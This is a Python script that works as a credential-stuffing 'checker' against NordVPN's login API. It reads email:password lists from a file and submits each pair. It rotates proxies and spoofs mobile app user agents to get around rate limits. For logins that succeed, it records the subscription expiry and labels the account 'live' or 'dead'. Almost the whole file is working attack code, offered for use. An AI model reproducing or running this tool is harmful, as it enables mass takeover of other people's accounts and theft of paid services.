import requests, time, random
from os import sys

class Main:
    def __init__(self):
        self.url = "https://api.nordvpn.com/v1/users/tokens"
        self.data = {
            'checked': 0,
            'live': 0,
            'dead': 0,
            'use_proxy': False,
            'save_live': False,
            'save_dead': False,
            'proxy_list': [],
        }
        self.user_agents = ['NordApp android (playstore/4.1.3) Android 5.1',
               'NordApp android (playstore/4.1.3) Android 6.0',
               'NordApp android (playstore/4.1.3) Android 7.1',
               'NordApp android (playstore/4.1.3) Android 8.0',
               'NordApp android (playstore/4.1.3) Android 9.0',
               'NordApp android (playstore/4.1.3) Android 10.0',
               'NordApp android (playstore/4.1.3) Android 4.2.2',
               'NordApp android (playstore/4.1.3) Android 4.4.2',
               'NordApp android (playstore/4.1.3) Android 5.1.1']
        
    def checker(self, email, password):
        if self.data['use_proxy'] == False:
            resp = requests.post(self.url, json={'username': email, 'password': password})
        else:
            try:
                resp = requests.post(self.url, json={'username': email, 'password': password}, proxies={'http': f"http://{self.data['proxy_list'][0]}", 'https': f"http://{self.data['proxy_list'][0]}"})
            except Exception as e:
                self.renewProxy(self.data['proxy_list'][0])
                return {'process': False, 'message': "Error to execute request", 'data': {'email': email, 'password': password}}
        
        
        if 'Too Many Requests' in resp.text:
            if self.data['use_proxy'] != False:
                self.renewProxy(self.data['proxy_list'][0])
            return {'process': False, 'message': 'Too Many Requests', 'data': {'email': email, 'password': password}}
    
        resp_json = resp.json()
    
        if resp_json.get('errors') != None:
            return {'process': False, 'message': resp_json['errors']['message'], 'data': {'email': email, 'password': password}}
        
        elif resp_json.get('user_id') != None:
            if self.data['use_proxy'] == False:
                expires = requests.get("https://api.nordvpn.com/v1/users/services", headers={"User-Agent": random.choice(self.user_agents)}, auth=('token', resp_json['token']))
            else:
                try:
                    expires = requests.get("https://api.nordvpn.com/v1/users/services", headers={"User-Agent": random.choice(self.user_agents)}, auth=('token', resp_json['token']), proxies={'http': f"http://{self.data['proxy_list'][0]}", 'https': f"http://{self.data['proxy_list'][0]}"})
                except Exception as e:
                    self.renewProxy(self.data['proxy_list'][0])
                    return {'process': False, 'message': "Error to execute request", 'data': {'email': email, 'password': password}}
            expires_data = expires.json()
            if isinstance(expires_data, list) == False:
                return {'process': False, 'message': expires_data['errors'][0]['message'], 'data': {'email': email, 'password': password}}
            else:
                if self.data['use_proxy'] == False:
                    return {'process': True, 'data': {'email': email, 'password': password, 'expires_at': expires_data[0]['expires_at']}}
                else:
                    return {'process': True, 'message': self.data['proxy_list'][0], 'data': {'email': email, 'password': password, 'expires_at': expires_data[0]['expires_at']}}


        
    def read(self, filename):
        output = []
        with open(filename, 'rb') as file:
            for i in file.readlines():
                output.append(i.decode().replace('\n', '').replace('\r', ''))
            file.close()
        return output
    
    def renewProxy(self, proxy):
        proxy_list = self.data['proxy_list']
        try:
            proxy_list.remove(proxy)
            return {'process': True}
        except Exception as error:
            return {'process': False, 'message': error} 
    
    def getData(self):
        return self.data    
        
    def use_proxy(self):
        resp = input("=>> Use proxy? [Y/n]:  ") 
        if resp.lower() == 'y':self.data['use_proxy'] = True
        elif resp.upper() == 'N':self.data['use_proxy'] = False
        else:
            print("\033[91m[!!] Invalid option\033[00m")
            sys.exit()
        time.sleep(2)
        
    def save_live(self):
        resp = input("=>> Save live accounts? [Y/n]:  ")
        if resp.lower() == 'y':self.data['save_live'] = True
        elif resp.upper() == 'N':self.data['save_live'] = False
        else:
            print("\033[91m[!!] Invalid option\033[00m")
            sys.exit()
        time.sleep(2)
        
    def save_dead(self):
        resp = input("=>> Save dead accounts? [Y/n]:  ")
        if resp.lower() == 'y':self.data['save_dead'] = True
        elif resp.upper() == 'N':self.data['save_dead'] = False
        else:
            print("\033[91m[!!] Invalid option\033[00m")
            sys.exit()
        time.sleep(2)